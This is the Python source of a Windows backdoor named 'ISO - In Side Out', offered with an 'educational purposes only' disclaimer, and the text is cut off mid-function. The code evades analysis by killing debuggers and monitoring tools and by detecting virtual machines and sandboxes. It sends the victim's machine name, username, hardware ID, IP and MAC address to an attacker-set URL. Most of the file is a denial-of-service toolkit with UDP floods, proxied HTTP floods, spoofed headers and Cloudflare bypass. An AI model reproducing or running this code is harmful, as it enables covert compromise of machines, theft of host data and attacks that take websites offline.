'''

            ISO - In Side Out
            
        created by CookiesKush420
           github.com/Callumgm
       
       
    This a highly sophisticated backdoor that can be
    used to gain access to a target machine and execute terminal commands.
    
    CREATED FOR EDUCATIONAL PURPOSES ONLY.
     
'''

### System Modules ###
import os
import re
import sys
import ssl
import wmi
import uuid
import httpx
import socks
import socket
import psutil
import ctypes
import shutil
import random
import signal
import paramiko
import platform
import win32api
import requests
import threading
import subprocess
import cloudscraper
import win32process

from proxyscrape import create_collector, get_collector
from requests.cookies import RequestsCookieJar
import undetected_chromedriver as webdriver
from datetime import datetime, timedelta
from scapy.all import ARP, Ether, srp
from urllib.parse import urlparse
from time import sleep, time
from threading import Thread
from typing import Tuple
from sys import stdout
from ctypes import *


# IP   = "IP_HERE"
# PORT = int("PORT_HERE")

IP   = "192.168.0.2"
PORT = int("1888")


class AntiDebug():

    def __init__(self):
        self.api                = "URL_HERE"
        self.vmcheck_switch     = True
        self.vtdetect_switch    = True
        self.listcheck_switch   = True
        self.anti_debug_switch  = True

        #region Infomation
        try: self.ip = requests.get("https://api.ipify.org").text
        except: self.ip = "None"
        self.serveruser = os.getenv("UserName")
        self.pc_name = os.getenv("COMPUTERNAME")
        self.mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        self.computer = wmi.WMI()
        self.os_info = self.computer.Win32_OperatingSystem()[0]
        self.os_name = self.os_info.Name.encode('utf-8').split(b'|')[0]
        self.gpu = self.computer.Win32_VideoController()[0].Name
        self.currentplat = self.os_name
        self.hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
        self.hwidlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt')
        self.pcnamelist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt')
        self.pcusernamelist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt')
        self.iplist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt')
        self.maclist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt')
        self.gpulist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/gpu_list.txt')
        self.platformlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_platforms.txt')
        #endregion

        self.sandboxDLLs = ["sbiedll.dll","api_log.dll","dir_watch.dll","pstorec.dll","vmcheck.dll","wpespy.dll"]
        self.program_blacklist = [
            "httpdebuggerui.exe", 
            "wireshark.exe", 
            "HTTPDebuggerSvc.exe", 
            "fiddler.exe", 
            "regedit.exe", 
            "taskmgr.exe", 
            "vboxservice.exe", 
            "df5serv.exe", 
            "processhacker.exe", 
            "vboxtray.exe", 
            "vmtoolsd.exe", 
            "vmwaretray.exe", 
            "ida64.exe", 
            "ollydbg.exe",
            "pestudio.exe", 
            "vmwareuser", 
            "vgauthservice.exe", 
            "vmacthlp.exe", 
            "x96dbg.exe", 
            "vmsrvc.exe", 
            "x32dbg.exe", 
            "vmusrvc.exe", 
            "prl_cc.exe", 
            "prl_tools.exe", 
            "xenservice.exe", 
            "qemu-ga.exe", 
            "joeboxcontrol.exe", 
            "ksdumperclient.exe", 
            "ksdumper.exe",
            "joeboxserver.exe"
        ]

    #region Functions
    def post_message(self, msg):
        requests.post(self.api, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'}, data={"content": f"{msg}"})

    def anti_debug(self):
        '''
        Will attempt to close any running debuggers then exit the program.
        comment out 'os._exit(1)' to make the program not exit on debugger detection.
        '''
        while True:
            try:
                sleep(0.7)
                for proc in psutil.process_iter():
                    if any(procstr in proc.name().lower() for procstr in self.program_blacklist):
                        try:
                            self.post_message(f"Anti-Debug Program: {proc.name()} was detected running on the system. Closing program...") ; proc.kill()
                            os._exit(1)
                        except(psutil.NoSuchProcess, psutil.AccessDenied): pass
            except: pass

    def block_dlls(self):
        while True:
            try:
                sleep(1)
                EvidenceOfSandbox = []
                allPids = win32process.EnumProcesses()
                for pid in allPids:
                    try:
                        hProcess = win32api.OpenProcess(0x0410, 0, pid)
                        try:
                            curProcessDLLs = win32process.EnumProcessModules(hProcess)
                            for dll in curProcessDLLs:
                                dllName = str(win32process.GetModuleFileNameEx(hProcess, dll)).lower()
                                for sandboxDLL in self.sandboxDLLs:
                                    if sandboxDLL in dllName:
                                        if dllName not in EvidenceOfSandbox: EvidenceOfSandbox.append(dllName)
                        finally:
                                win32api.CloseHandle(hProcess)
                    except: pass
                if EvidenceOfSandbox:
                    requests.post(f'{self.api}',json={'content': f"""```yaml
        The following sandbox-indicative DLLs were discovered loaded in processes running on the system. Do not proceed.
        Dlls: {EvidenceOfSandbox}
        ```"""}) ; os._exit(1)
            except: pass
    
    def ram_check(self):
        class MEMORYSTATUSEX(ctypes.Structure):
            _fields_ = [
                ("dwLength", ctypes.c_ulong),
                ("dwMemoryLoad", ctypes.c_ulong),
                ("ullTotalPhys", ctypes.c_ulonglong),
                ("ullAvailPhys", ctypes.c_ulonglong),
                ("ullTotalPageFile", ctypes.c_ulonglong),
                ("ullAvailPageFile", ctypes.c_ulonglong),
                ("ullTotalVirtual", ctypes.c_ulonglong),
                ("ullAvailVirtual", ctypes.c_ulonglong),
                ("sullAvailExtendedVirtual", ctypes.c_ulonglong),
            ]

        memoryStatus = MEMORYSTATUSEX()
        memoryStatus.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
        ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(memoryStatus))

        if memoryStatus.ullTotalPhys/1073741824 < 1:
            requests.post(f'{self.api}',json={'content': f"""```yaml
    Ram Check: Less than 4 GB of RAM exists on this system. Exiting program...
    ```"""}) ; os._exit(1)

    def is_debugger(self):
        isDebuggerPresent = windll.kernel32.IsDebuggerPresent()

        if (isDebuggerPresent):
            requests.post(f'{self.api}',json={'content': f"""```yaml
    IsDebuggerPresent: A debugger is present, exiting program...
    ```"""}) ; os._exit(1)

        if ctypes.windll.kernel32.CheckRemoteDebuggerPresent(ctypes.windll.kernel32.GetCurrentProcess(), False) != 0:
            requests.post(f'{self.api}',json={'content': f"""```yaml
    CheckRemoteDebuggerPresent: A debugger is present, exiting program...
    ```"""}) ; os._exit(1)

    def disk_check(self):
        minDiskSizeGB = 50
        if len(sys.argv) > 1: minDiskSizeGB = float(sys.argv[1])
        _, diskSizeBytes, _ = win32api.GetDiskFreeSpaceEx()
        diskSizeGB = diskSizeBytes/1073741824

        if diskSizeGB < minDiskSizeGB:
            requests.post(f'{self.api}',json={'content': f"""```yaml
    Disk Check: The disk size of this host is {diskSizeGB} GB, which is less than the minimum {minDiskSizeGB} GB. Exiting program...
    ```"""}) ; os._exit(1)

    def vtdetect(self):
        requests.post(self.api, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'}, data={"content": f"""```yaml
    ![PC DETECTED]!  
    PC Name: {self.pc_name}
    PC Username: {self.serveruser}
    HWID: {self.hwid}
    IP: {self.ip}
    MAC: {self.mac}
    PLATFORM: {self.os_name}
    CPU: {self.computer.Win32_Processor()[0].Name}
    RAM: {str(round(psutil.virtual_memory().total / (1024.0 **3)))} GB
    GPU: {self.gpu}
    TIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}```"""})

    def vmcheck(self):
        def get_base_prefix_compat(): # define all of the checks
            return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix

        def in_virtualenv(): 
            return get_base_prefix_compat() != sys.prefix

        if in_virtualenv(): # If vm is detected
            self.post_message("**VM DETECTED, EXITING PROGRAM...**") ; os._exit(1)
        
        def registry_check():  #VM REGISTRY CHECK SYSTEM [BETA]
            reg1 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
            reg2 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")       
            
            if reg1 != 1 and reg2 != 1:
                self.post_message("VMware Registry Detected") ; os._exit(1)

        def processes_and_files_check():
            vmware_dll      = os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")
            virtualbox_dll  = os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")   

            process         = os.popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
            processList     = []

            for processNames in process.split(" "):
                if ".exe" in processNames: processList.append(processNames.replace("K\n", "").replace("\n", ""))

            if "VMwareService.exe" in processList or "VMwareTray.exe" in processList: 
                self.post_message("VMwareService.exe & VMwareTray.exe process are running") ; os._exit(1)
                            
            if os.path.exists(vmware_dll): 
                self.post_message("**Vmware DLL Detected**") ; os._exit(1)
                
            if os.path.exists(virtualbox_dll): 
                self.post_message("**VirtualBox DLL Detected**") ; os._exit(1)   

        def mac_check():
            mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
            vmware_mac_list = ["00:05:69", "00:0c:29", "00:1c:14", "00:50:56"]
            if mac_address[:8] in vmware_mac_list: self.post_message("**VMware MAC Address Detected**") ; os._exit(1)

        registry_check(), processes_and_files_check(), mac_check()
        self.post_message("[+] VM Not Detected") 

    def listcheck(self):
        try:
            if self.hwid in self.hwidlist.text:
                self.post_message(f"**Blacklisted HWID Detected. HWID:** `{self.hwid}`")
                sleep(2) ; os._exit(1)
        except:
            self.post_message('[ERROR]: Failed to connect to database.')
            sleep(2) ; os._exit(1)

        try:
            if self.serveruser in self.pcusernamelist.text:
                self.post_message(f"**Blacklisted PC User:** `{self.serveruser}`")
                sleep(2) ; os._exit(1)
        except:
            self.post_message('[ERROR]: Failed to connect to database.')
            sleep(2) ; os._exit(1)

        try:
            if self.pc_name in self.pcnamelist.text:
                self.post_message(f"**Blacklisted PC Name:** `{self.pc_name}`")
                sleep(2) ; os._exit(1)
        except:
            self.post_message('[ERROR]: Failed to connect to database.')
            sleep(2) ; os._exit(1)

        try:
            if self.ip in self.iplist.text:
                self.post_message(f"**Blacklisted IP:** `{self.ip}`")
                sleep(2) ; os._exit(1)
        except:
            self.post_message('[ERROR]: Failed to connect to database.')
            sleep(2) ; os._exit(1)

        try:
            if self.mac in self.maclist.text:
                self.post_message(f"**Blacklisted MAC:** `{self.mac}`")
                sleep(2) ; os._exit(1)
        except:
            self.post_message('[ERROR]: Failed to connect to database.')
            sleep(2) ; os._exit(1)

        try:
            if self.gpu in self.gpulist.text:        
                self.post_message(f"**Blacklisted GPU:** `{self.gpu}`")
                sleep(2) ; os._exit(1)
        except:
            self.post_message('[ERROR]: Failed to connect to database.')
            sleep(2) ; os._exit(1)
    #endregion

    def start(self):
        self.is_debugger(), self.disk_check(), self.ram_check() # Run all checks
        if self.anti_debug_switch:
            Thread(name='Anti-Debug', target=self.anti_debug).start()
            Thread(name='Anti-DLL', target=self.block_dlls).start()
        
        if self.vtdetect_switch:     self.vtdetect()      # VTDETECT
        if self.vmcheck_switch:      self.vmcheck()       # VMCHECK
        if self.listcheck_switch:    self.listcheck()     # LISTCHECK


class Attack():
    def __init__(self) -> None:
        self.ua         = ""
        self.collector  = create_collector('my-collector', ['socks4', 'socks5', 'http', 'https'])
        self.collector  = get_collector('my-collector')

        self.proxy_list = []

    #region get
    def get_us(self):
        try: self.ua += requests.get('https://pastebin.com/raw/cuWMcT7N').text.split('\n')
        except: pass

    def get_target(self, url):
        url = url.rstrip()
        target = {}
        target['uri'] = urlparse(url).path
        if target['uri'] == "":
            target['uri'] = "/"
        target['host'] = urlparse(url).netloc
        target['scheme'] = urlparse(url).scheme
        if ":" in urlparse(url).netloc:
            target['port'] = urlparse(url).netloc.split(":")[1]
        else:
            target['port'] = "443" if urlparse(url).scheme == "https" else "80"
            pass
        return target

    def get_proxys(self):
        try:
            for proxy in self.collector.get_proxies():
                proxie = str(proxy.host + ':' + proxy.port + '\n')
                self.proxy_list.append(proxie)
            return True
        except: return False

    def get_cookie(self, url):
        global useragent, cookieJAR, cookie
        options = webdriver.ChromeOptions()
        arguments = [
        '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars', '--disable-logging', '--disable-login-animations',
        '--disable-notifications', '--disable-gpu', '--headless', '--lang=ko_KR', '--start-maxmized',
        '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en' 
        ]
        for argument in arguments:
            options.add_argument(argument)
        driver = webdriver.Chrome(options=options)
        driver.implicitly_wait(3)
        driver.get(url)
        for _ in range(60):
            cookies = driver.get_cookies()
            tryy = 0
            for i in cookies:
                if i['name'] == 'cf_clearance':
                    cookieJAR = driver.get_cookies()[tryy]
                    useragent = driver.execute_script("return navigator.userAgent")
                    cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
                    driver.quit()
                    return True
                else:
                    tryy += 1
                    pass
            sleep(1)
        driver.quit()
        return False

    def spoof(self, target):
        addr    = [192, 168, 0, 1]
        d       = '.'
        addr[0] = str(random.randrange(11, 197))
        addr[1] = str(random.randrange(0, 255))
        addr[2] = str(random.randrange(0, 255))
        addr[3] = str(random.randrange(2, 254))
        spoofip = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
        return (
            "X-Forwarded-Proto: Http\r\n"
            f"X-Forwarded-Host: {target['host']}, 1.1.1.1\r\n"
            f"Via: {spoofip}\r\n"
            f"Client-IP: {spoofip}\r\n"
            f'X-Forwarded-For: {spoofip}\r\n'
            f'Real-IP: {spoofip}\r\n'
        )

    #endregion

    #region layer4
    def runflooder(self, host, port, th, t):
        until = datetime.now() + timedelta(seconds=int(t))
        rand  = random._urandom(4096)

        for _ in range(int(th)):
            try: threading.Thread(target=self.flooder, args=(host, port, rand, until)).start()
            except: pass

    def flooder(self, host, port, rand, until_datetime):
        sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

        while (until_datetime - datetime.now()).total_seconds() > 0:
            try: sock.sendto(rand, (host, int(port)))
            except: sock.close() ; pass

    def runsender(self, host, port, threads, time):
        payload = random._urandom(60000)
        until   = datetime.now() + timedelta(seconds=int(time))

        for _ in range(int(threads)):
            try: threading.Thread(target=self.sender, args=(host, port, until, payload,)).start()
            except: pass

    def sender(self, host, port, until_datetime, payload):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        while (until_datetime - datetime.now()).total_seconds() > 0:
            try: sock.sendto(payload, (host, int(port)))
            except: sock.close()    
    #endregion

    #region METHODS

    #region HEAD
    def Launch(self, url, th, t, method): #testing
        until = datetime.now() + timedelta(seconds=int(t))
        for _ in range(int(th)):
            try:
                exec("threading.Thread(target=self.Attack"+method+", args=(url, until)).start()")
            except:
                pass

    def LaunchHEAD(self, url, th, t):
        until = datetime.now() + timedelta(seconds=int(t))
        for _ in range(int(th)):
            try:
                thd = threading.Thread(target=self.AttackHEAD, args=(url, until))
                thd.start()
            except:
                pass

    def AttackHEAD(self, url, until_datetime):
        while (until_datetime - datetime.now()).total_seconds() > 0:
            try:
                requests.head(url)
                requests.head(url)
            except:
                pass
    #endregion

    #region POST
    def LaunchPOST(self, url, th, t):
        until = datetime.now() + timedelta(seconds=int(t))
        for _ in range(int(th)):
            try:
                thd = threading.Thread(target=self.AttackPOST, args=(url, until))
                thd.start()
            except:
                pass

    def AttackPOST(self, url, until_datetime):
        while (until_datetime - datetime.now()).total_seconds() > 0:
            try:
                requests.post(url)
                requests.post(url)
            except:
                pass
    #endregion

    #region RAW
    def LaunchRAW(self, url, th, t):
        until = datetime.now() + timedelta(seconds=int(t))
        for _ in range(int(th)):
            try:
                thd = threading.Thread(target=self.AttackRAW, args=(url, until))
                thd.start()
            except:
                pass

    def AttackRAW(self, url, until_datetime):
        while (until_datetime - datetime.now()).total_seconds() > 0:
            try:
                requests.get(url)
                requests.get(url)
            except:
                pass
    #endregion

    #region PXRAW
    def LaunchPXRAW(self, url, th, t):
        until = datetime.now() + timedelta(seconds=int(t))
        for _ in range(int(th)):
            try:
                thd = threading.Thread(target=self.AttackPXRAW, args=(url, until))
                thd.start()
            except:
                pass

    def AttackPXRAW(self, url, until_datetime):
        while (until_datetime - datetime.now()).total_seconds() > 0:
            proxy = 'http://'+str(random.choice(self.proxy_list))
            proxy = {
                'http': proxy,   
                'https': proxy,
            }
            try:
                requests.get(url, proxies=proxy)
                requests.get(url, proxies=proxy)
            except:
                pass
    #endregion

    #region PXSOC
    def LaunchPXSOC(self, url, th, t):
        target  = self.get_target(url)
        until   = datetime.now() + timedelta(seconds=int(t))
        req     = "GET " +target['uri'] + " HTTP/1.1\r\n"
        req     += "Host: " + target['host'] + "\r\n"
        req     += "User-Agent: " + random.choice(self.ua) + "\r\n"
        req     += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
        req     += "Connection: Keep-Alive\r\n\r\n"
        
        for _ in range(int(th)):
            try:
                threading.Thread(target=self.AttackPXSOC, args=(target, until, req)).start()
            except: pass

    def AttackPXSOC(self, target, until_datetime, req):
        while (until_datetime - datetime.now()).total_seconds() > 0:
            try:
                proxy = random.choice(self.proxy_list).split(":")
                if target['scheme'] == 'https':
                    s = socks.socksocket()
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
                    s.connect((str(target['host']), int(target['port'])))
                    s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
                else:
                    s = socks.socksocket()
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
                    s.connect((str(target['host']), int(target['port'])))
                try:
                    for _ in range(100):
                        s.send(str.encode(req))
                except:
                    s.close()
            except:
                return
    #endregion

    #region SOC
    def LaunchSOC(self, url, th, t):
        target = self.get_target(url)
        until = datetime.now() + timedelta(seconds=int(t))
        req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
        req += "User-Agent: " + random.choice(self.ua) + "\r\n"
        req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
        req += "Connection: Keep-Alive\r\n\r\n"
        for _ in range(int(th)):
            try:
                thd = threading.Thread(target=self.AttackSOC, args=(target, until, req))
                thd.start()
            except:
                pass

    def AttackSOC(self, target, until_datetime, req):
        if target['scheme'] == 'https':
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target['host']), int(target['port'])))
            s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
        else:
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target['host']), int(target['port'])))
        while (until_datetime - datetime.now()).total_seconds() > 0:
            try:
                try:
                    for _ in range(100):
                        s.send(str.encode(req))
                except:
                    s.close()
            except:
                pass
    #endregion

    #region PPS
    def LaunchPPS(self, url, th, t):
        target = self.get_target(url)
        until = datetime.now() + timedelta(seconds=int(t))
        for _ in range(int(th)):
            try:
                thd = threading.Thread(target=self.AttackPPS, args=(target, until))
                thd.start()
            except:
                pass

    def AttackPPS(self, target, until_datetime): #
        if target['scheme'] == 'https':
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target['host']), int(target['port'])))
            s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
        else:
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target['host']), int(target['port'])))
        while (until_datetime - datetime.now()).total_seconds() > 0:
            try:
                try:
                    for _ in range(100):
                        s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
                except:
                    s.close()
            except:
                pass
    #endregion

    #region NULL
    def LaunchNULL(self, url, th, t):
        target = self.get_target(url)
        until = datetime.now() + timedelta(seconds=int(t))
        req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
        req += "User-Agent: null\r\n"
        req += "Referrer: null\r\n"
        req += self.spoof(target) + "\r\n"
        for _ in range(int(th)):
            try:
                thd = threading.Thread(target=self.AttackNULL, args=(target, until, req))
                thd.start()
            except:
                pass

    def AttackNULL(self, target, until_datetime, req): #
        if target['scheme'] == 'https':
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target['host']), int(target['port'])))
            s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
        else:
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target['host']), int(target['port'])))
        while (until_datetime - datetime.now()).total_seconds() > 0:
            try:
                try:
                    for _ in range(100):
                        s.send(str.encode(req))
                except:
                    s.close()
            except:
                pass
    #endregion

    #region SPOOF
    def LaunchSPOOF(self, url, th, t):
        target = self.get_target(url)
        until = datetime.now() + timedelta(seconds=int(t))
        req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
        req += "User-Agent: " + random.choice(self.ua) + "\r\n"
        req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
        req += self.spoof(target)
        req += "Connection: Keep-Alive\r\n\r\n"
        for _ in range(int(th)):
            try:
                thd = threading.Thread(target=self.AttackSPOOF, args=(target, until, req))
                thd.start()
            except:
                pass

    def AttackSPOOF(self, target, until_datetime, req): #
        if target['scheme'] == 'https':
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target['host']), int(target['port'])))
            s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
        else:
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target['host']), int(target['port'])))
        while (until_datetime - datetime.now()).total_seconds() > 0:
            try:
                try:
                    for _ in range(100):
                        s.send(str.encode(req))
                except:
                    s.close()
            except:
                pass
    #endregion

    #region PXSPOOF
    def LaunchPXSPOOF(self, url, th, t, proxy):
        target = self.get_target(url)
        until = datetime.now() + timedelta(seconds=int(t))
        req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
        req += "User-Agent: " + random.choice(self.ua) + "\r\n"
        req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
        req += self.spoof(target)
        req += "Connection: Keep-Alive\r\n\r\n"
        for _ in range(int(th)):
            try:
                randomproxy = random.choice(proxy)
                thd = threading.Thread(target=self.AttackPXSPOOF, args=(target, until, req, randomproxy))
                thd.start()
            except:
                pass

    def AttackPXSPOOF(self, target, until_datetime, req, proxy): #
        proxy = proxy.split(":")
        print(proxy)
        try:
            if target['scheme'] == 'https':
                s = socks.socksocket()
                #s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
                s.connect((str(target['host']), int(target['port'])))
                s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
            else:
                s = socks.socksocket()
                #s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
                s.connect((str(target['host']), int(target['port'])))
        except:
            return
        while (until_datetime - datetime.now()).total_seconds() > 0:
            try:
                try:
                    for _ in range(100):
                        s.send(str.encode(req))
                except:
                    s.close()
            except:
                pass
    #endregion

    #region CFB
    def LaunchCFB(self, url, th, t):
        until = datetime.now() + timedelta(seconds=int(t))
        scraper = cloudscraper.create_scraper()
        for _ in range(int(th)):
            try:
                thd = threading.Thread(target=self.AttackCFB, args=(url, until, scraper))
                thd.start()
            except:
                pass

    def AttackCFB(self, url, until_datetime, scraper):
        while (until_datetime - datetime.now()).total_seconds() > 0:
            try:
                scraper.get(url, timeout=15)
                scraper.get(url, timeout=15)
            except:
                pass
    #endregion

    #region PXCFB
    def LaunchPXCFB(self, url, th, t):
        until = datetime.now() + timedelta(seconds=int(t))
        scraper = cloudscraper.create_scraper()
        for _ in range(int(th)):
            try:
                thd = threading.Thread(target=self.AttackPXCFB, args=(url, until, scraper))
                thd.start()
            except:
                pass

    def AttackPXCFB(self, url, until_datetime, scraper):
        while (until_datetime - datetime.now()).total_seconds() > 0:
            try:
                proxy = {
                        'http': 'http://'+str(random.choice(self.proxy_list)),   
                        'https': 'http://'+str(random.choice(self.proxy_list)),
                }
                scraper.get(url, proxies=proxy)
                scraper.get(url, proxies=proxy)
            except:
                pass
    #endregion

    #region CFPRO
    def LaunchCFPRO(self, url, th, t):
        until = datetime.now() + timedelta(seconds=int(t))
        session = requests.Session()
        scraper = cloudscraper.create_scraper(sess=session)
        jar = RequestsCookieJar()
        jar.set(cookieJAR['name'], cookieJAR['value'])
        scraper.cookies = jar
        for _ in range(int(th)):
            try:
                thd = threading.Thread(target=self.AttackCFPRO, args=(url, until, scraper))
                thd.start()
            except:
                pass

    def AttackCFPRO(self, url, until_datetime, scraper):
        headers = {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'TE': 'trailers',
        }
        while (until_datetime - datetime.now()).total_seconds() > 0:
            try:
                scraper.get(url=url, headers=headers, allow_redirects=False)
                scraper.get(url=url, headers=headers, allow_redirects=False)
            except:
                pass
    #endregion

    #region CFSOC
    def LaunchCFSOC(self, url, th, t):
        until = datetime.now() + timedelta(seconds=int(t))
        target = self.get_target(url)
        req =  'GET '+ target['uri'] +' HTTP/1.1\r\n'
        req += 'Host: ' + target['host'] + '\r\n'
        req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
        req += 'Accept-Encoding: gzip, deflate, br\r\n'
        req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
        req += 'Cache-Control: max-age=0\r\n'
        req += 'Cookie: ' + cookie + '\r\n'
        req += f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
        req += 'sec-ch-ua-mobile: ?0\r\n'
        req += 'sec-ch-ua-platform: "Windows"\r\n'
        req += 'sec-fetch-dest: empty\r\n'
        req += 'sec-fetch-mode: cors\r\n'
        req += 'sec-fetch-site: same-origin\r\n'
        req += 'Connection: Keep-Alive\r\n'
        req += 'User-Agent: ' + useragent + '\r\n\r\n\r\n'
        for _ in range(int(th)):
            try:
                thd = threading.Thread(target=self.AttackCFSOC,args=(until, target, req,))
                thd.start()
            except:  
                pass

    def AttackCFSOC(self, until_datetime, target, req):
        if target['scheme'] == 'https':
            packet = socks.socksocket()
            packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            packet.connect((str(target['host']), int(target['port'])))
            packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
        else:
            packet = socks.socksocket()
            packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            packet.connect((str(target['host']), int(target['port'])))
        while (until_datetime - datetime.now()).total_seconds() > 0:
            try:
                for _ in range(10):
                    packet.send(str.encode(req))
            except:
                packet.close()
                pass
    #endregion

    #region SKY
    def attackSKY(self, url, timer, threads):
        for i in range(int(threads)):
            threading.Thread(target=self.LaunchSKY, args=(url, timer)).start()

    def LaunchSKY(self, url, timer):
        proxy = random.choice(self.proxy_list).strip().split(":")
        timelol = time() + int(timer)
        req =  "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
        req += "Cache-Control: no-cache\r\n"
        req += "User-Agent: " + random.choice(self.ua) + "\r\n"
        req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
        req += "Sec-Fetch-Site: same-origin\r\n"
        req += "Sec-GPC: 1\r\n"
        req += "Sec-Fetch-Mode: navigate\r\n"
        req += "Sec-Fetch-Dest: document\r\n"
        req += "Upgrade-Insecure-Requests: 1\r\n"
